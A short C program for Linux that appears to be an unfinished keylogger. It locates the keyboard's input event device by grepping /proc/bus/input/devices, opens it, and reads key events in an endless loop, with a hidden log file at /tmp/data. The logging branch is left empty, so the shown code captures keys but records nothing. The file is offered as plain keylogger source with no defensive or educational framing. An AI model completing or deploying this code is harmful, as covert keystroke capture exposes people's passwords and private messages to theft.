#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>

#define LOGFILE "/tmp/data"

char *getEvent();

int main(int argc, char **argv){
  struct input_event ev;
  static char path_keyboard[20] = "/dev/input/";
  strcat(path_keyboard, getEvent());
  int device_keyboard = open(path_keyboard, O_RDONLY);
  FILE *fp = fopen(LOGFILE, "a");

  while (1) {
    read(device_keyboard, &ev, sizeof(ev));
    if (ev.type == EV_KEY && ev.value == 0) {
    }
  }
}

char *getEvent(){
  char *command = (char *) "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -E -B1 120013 | grep -E -o event[0-9]";
  static char event[8];
  FILE *pipe = popen(command, "r");
  if (!pipe)
    exit(1);
  fgets(event, 8, pipe);
  pclose(pipe);
  event[strlen(event) - 1] = 0x0;
  return event;
}
